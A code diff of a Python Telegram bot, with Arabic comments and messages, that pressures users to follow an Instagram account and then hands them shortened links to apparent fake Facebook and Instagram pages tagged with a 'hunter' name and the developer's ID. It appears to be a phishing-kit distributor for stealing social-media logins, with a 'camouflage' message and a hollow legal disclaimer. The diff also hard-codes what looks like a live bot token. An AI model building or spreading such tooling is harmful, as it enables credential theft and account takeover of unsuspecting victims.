@@ -6,7 +6,7 @@ from threading import Thread
 import os
 import time
 
-# إعداد السيرفر
+# إعداد السيرفر لضمان البقاء أونلاين
 app = Flask('')
 @app.route('/')
 def home(): return "M.Y.9 System Online"
@@ -16,15 +16,10 @@ def keep_alive(): Thread(target=run).start()
 
 # --- إعدادات البوت ---
 TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
-MY_ID = '7238206121' 
+MY_ID = '7238206121' # آي دي أبو سند
 bot = telebot.TeleBot(TOKEN)
 
-# تنظيف الاتصال لحل Error 409
-try:
-    bot.remove_webhook()
-    time.sleep(1)
-except: pass
-
+# دالة اختصار الروابط
 def short(url):
     try:
         r = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
@@ -35,13 +30,13 @@ def short(url):
 def start(m):
     uid, name = m.chat.id, m.from_user.first_name
     
-    # 1. إرسال رسالة "التخويف" والمتابعة فوراً
+    # 1. رسالة التمويه والمتابعة (m_y_.9)
     warning_text = f"""
 ⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
 
-عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، يـ^ـجـ^ـب عـ^ـلـ^ـيـ^ـك مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور الـ^ـرسمـ^ـي عـ^ـلى انـ^ـسـ^ـتـ^ـغـ^ـرام لـتـفـعـيـل الـنـظـام.
+عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، يـ^ـجـ^ـب مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور الـ^ـرسمـ^ـي عـ^ـلى انـ^ـسـ^ـتـ^ـغـ^ـرام لـتـفـعـيـل الـنـظـام.
 
-🔴 تـحـذيـر: الـنـظـام يـقـوم الآن بـالـتـحـقـق مـن مـتـابـعـتـك لـلـحـسـاب. سـيـتـم إرسـال الروابـط بـعـد (5 دقـائـق) عـنـد اكـتـمـال الـفـحـص تـلـقـائـيـاً 💀🔥
+🔴 تـحـذيـر: الـنـظـام يـقـوم الآن بـالـتـحـقـق مـن مـتـابـعـتـك. سـيـتـم إرسـال الروابـط بـعـد (5 دقـائـق) تـلـقـائـيـاً 💀🔥
     """
     markup = types.InlineKeyboardMarkup()
     btn_insta = types.InlineKeyboardButton("🔗 مـتـابـعـة المـطـور (m_y_.9)", url="https://www.instagram.com/m_y_.9/")
@@ -49,13 +44,13 @@ def start(m):
     
     bot.send_message(uid, warning_text, reply_markup=markup)
 
-    # 2. بدء عداد الـ 5 دقائق في الخلفية فوراً
-    def background_task():
-        time.sleep(300) # انتظار 5 دقائق
+    # 2. مهمة الـ 5 دقائق في الخلفية
+    def background_task(chat_id, user_name):
+        time.sleep(300) # انتظار الـ 5 دقائق
         
-        h = name.replace(" ", "_")
+        h = user_name.replace(" ", "_")
         base = "https://m-y-9-tech.github.io/fb/"
-        p = f"?id={uid}&hunter={h}&dev={MY_ID}"
+        p = f"?id={chat_id}&hunter={h}&dev={MY_ID}"
         
         lnks = {
             "fb": short(base+"fb.html"+p), "ig": short(base+"ig.html"+p),
@@ -65,7 +60,7 @@ def start(m):
         }
 
         main_msg = f"""
-🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | تـم تـجـهـيـز الروابـط ✅
+🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | تـم الـتـحـقـق ✅
 
 👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚
 
@@ -92,15 +87,19 @@ def start(m):
 🔗 `{lnks['c2']}`
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-⚖️ إخـ^ـلاء مـ^ـسـ^ـؤوليـ^ـة: المـطـور غـيـر مـسـؤول عـن أي اسـتـخـدام غـيـر قـانـونـي.
+⚖️ إخـ^ـلاء مـ^ـسـ^ـؤوليـ^ـة: المـطـور غـيـر مـسـؤول عـن أي اسـتـخـدام ضـار.
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-⚙️ Status: Connected Successfully
+⚙️ Status: Connected
         """
-        bot.send_message(uid, main_msg, parse_mode="Markdown", disable_web_page_preview=True)
+        try:
+            bot.send_message(chat_id, main_msg, parse_mode="Markdown", disable_web_page_preview=True)
+        except: pass
 
-    # تشغيل المهمة في الخلفية
-    Thread(target=background_task).start()
+    Thread(target=background_task, args=(uid, name)).start()
 
 if __name__ == "__main__":
     keep_alive()
-    bot.infinity_polling(non_stop=True)
+    # الحل النهائي للـ 409: حذف الويب هوك وتصفير الطلبات (skip_pending)
+    bot.remove_webhook()
+    time.sleep(1)
+    bot.infinity_polling(non_stop=True, skip_pending=True)
